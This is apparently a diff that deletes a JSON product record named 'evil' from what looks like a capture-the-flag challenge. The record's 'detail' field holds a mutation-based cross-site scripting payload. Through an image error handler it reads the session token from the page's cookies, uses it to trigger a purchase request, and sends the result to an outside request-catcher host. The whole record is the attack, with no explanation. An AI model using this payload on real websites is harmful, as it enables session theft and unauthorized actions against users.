@@ -1,7 +1,0 @@
-{
-  "id": 1,
-  "name": "evil",
-  "price": 1,
-  "detail": "<math><mtext><table><mglyph><style><!--</style><img title=\"--><img src=x onerror=fetch('/4/buy',{method:'POST',headers:{token:document.cookie.split('=')[1]}}).then(r=>r.json()).then(d=>location='https://llkkskh.request.dreamhack.games/?'+d.data)>\">",
-  "poster": "x"
-}
